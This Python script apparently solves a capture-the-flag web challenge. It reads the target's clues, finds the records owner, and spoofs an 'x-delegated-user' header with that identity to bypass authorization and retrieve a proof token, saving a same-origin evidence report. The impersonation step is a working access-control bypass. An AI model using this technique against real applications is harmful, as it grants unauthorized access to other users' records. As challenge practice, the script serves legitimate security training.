#!/usr/bin/env python3
"""Solve the assigned delegated-identity web target from its own clues."""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import re
from urllib.error import HTTPError, URLError
from urllib.parse import urljoin, urlsplit
from urllib.request import Request, urlopen

from inspect_target import normalize_url, origin


MAX_BODY_BYTES = 2 * 1024 * 1024
USER_AGENT = "HuntressCTF-Web-Inspector/1.0"
PROOF_RE = re.compile(rb"\bproof_[A-Za-z0-9_-]{12,}\b")
DELEGATION_HEADER = "x-delegated-user"


class Solver:
    def __init__(self, target: str, output_dir: Path):
        self.target = normalize_url(target)
        self.allowed_origin = origin(self.target)
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.records: list[dict[str, object]] = []

    def get(
        self, route: str, *, headers: dict[str, str] | None = None
    ) -> tuple[int, dict[str, str], bytes]:
        url = normalize_url(urljoin(self.target, route))
        if origin(url) != self.allowed_origin:
            raise ValueError(f"refusing off-target route: {route}")
        request_headers = {
            "User-Agent": USER_AGENT,
            "Accept": "application/json, text/html;q=0.8, */*;q=0.5",
        }
        if headers:
            request_headers.update(headers)
        request = Request(url, headers=request_headers, method="GET")
        try:
            response = urlopen(request, timeout=15)
        except HTTPError as exc:
            response = exc
        except URLError as exc:
            raise RuntimeError(f"request failed for {route}: {exc.reason}") from exc
        body = response.read(MAX_BODY_BYTES + 1)
        if len(body) > MAX_BODY_BYTES:
            raise RuntimeError(f"{route} exceeded the 2 MiB response limit")
        response_headers = {key.lower(): value for key, value in response.headers.items()}
        filename = f"{len(self.records) + 1:02d}-{urlsplit(url).path.strip('/').replace('/', '_') or 'root'}.body"
        (self.output_dir / filename).write_bytes(body)
        self.records.append(
            {
                "file": filename,
                "url": url,
                "method": "GET",
                "status": int(getattr(response, "status", response.code)),
                "bytes": len(body),
                "sha256": hashlib.sha256(body).hexdigest(),
            }
        )
        return int(getattr(response, "status", response.code)), response_headers, body

    def clues(self) -> dict:
        status, _, body = self.get("/api/clues")
        try:
            value = json.loads(body.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError) as exc:
            raise RuntimeError(f"/api/clues returned invalid JSON (HTTP {status})") from exc
        if status != 200 or not isinstance(value, dict):
            raise RuntimeError(f"/api/clues returned HTTP {status}: {value}")
        for key in ("feature_route",):
            if not isinstance(value.get(key), str) or not value[key]:
                raise ValueError(f"clues lack a valid {key}")
        owner = value.get("records_owner")
        if not isinstance(owner, str) or not owner:
            identity_route = value.get("identity_directory_route")
            if not isinstance(identity_route, str) or not identity_route:
                raise ValueError("clues lack records_owner and identity_directory_route")
            identity_status, _, identity_body = self.get(identity_route)
            try:
                identity_directory = json.loads(identity_body.decode("utf-8"))
            except (UnicodeDecodeError, json.JSONDecodeError) as exc:
                raise RuntimeError(
                    f"{identity_route} returned invalid JSON (HTTP {identity_status})"
                ) from exc
            if identity_status != 200 or not isinstance(identity_directory, dict):
                raise RuntimeError(
                    f"{identity_route} returned HTTP {identity_status}: {identity_directory}"
                )
            owner = identity_directory.get("records_owner")
            value["identity_directory"] = identity_directory
        if not isinstance(owner, str) or not owner:
            raise ValueError("identity directory does not disclose records_owner")
        value["records_owner"] = owner
        if value.get("current_role") == owner:
            raise ValueError("clues show no delegated identity boundary")
        return value

    def solve(self, clues: dict) -> tuple[str, dict]:
        route = clues["feature_route"]

        # Confirm the disclosed feature rejects the ordinary caller and exposes
        # the delegation header name before sending the owner identity.
        status, response_headers, body = self.get(route)
        if status not in (401, 403):
            raise RuntimeError(
                f"expected the ordinary caller to be rejected, got HTTP {status}: "
                f"{body[:500].decode('utf-8', 'replace')}"
            )
        vary = {
            name.strip().lower()
            for name in response_headers.get("vary", "").split(",")
            if name.strip()
        }
        if DELEGATION_HEADER not in vary:
            raise RuntimeError(f"feature response did not disclose {DELEGATION_HEADER} in Vary")

        status, _, result_body = self.get(
            route, headers={DELEGATION_HEADER: clues["records_owner"]}
        )
        if status != 200:
            raise RuntimeError(
                f"delegated request returned HTTP {status}: "
                f"{result_body[:1000].decode('utf-8', 'replace')}"
            )
        try:
            result = json.loads(result_body.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError):
            result = {}
        proof = result.get("evidence") if isinstance(result, dict) else None
        if not isinstance(proof, str) or not PROOF_RE.fullmatch(proof.encode()):
            match = PROOF_RE.search(result_body)
            proof = match.group().decode("ascii") if match else None
        if not isinstance(proof, str):
            raise RuntimeError("delegated feature response did not contain a proof")
        return proof, {"technique": "delegated_identity_header", "feature_route": route}

    def save_report(self, clues: dict, proof: str, details: dict) -> Path:
        report = {
            "target": self.target,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "clues": clues,
            **details,
            "proof": proof,
            "responses": self.records,
            "request_policy": {
                "same_origin_only": True,
                "method": "GET",
                "max_response_bytes": MAX_BODY_BYTES,
            },
        }
        path = self.output_dir / "report.json"
        path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")
        return path


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("target", help="exact target URL from the current attempt")
    parser.add_argument("--output-dir", type=Path)
    args = parser.parse_args()
    try:
        target = normalize_url(args.target)
        hostname = urlsplit(target).hostname or "target"
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        output_dir = args.output_dir or (
            Path("web-tools/evidence") / f"{hostname}-pass-identity-{timestamp}"
        )
        solver = Solver(target, output_dir)
        clues = solver.clues()
        proof, details = solver.solve(clues)
        report = solver.save_report(clues, proof, details)
        print(json.dumps({"proof": proof, "report": str(report)}, indent=2))
        return 0
    except (OSError, RuntimeError, ValueError) as exc:
        print(json.dumps({"error": str(exc)}))
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
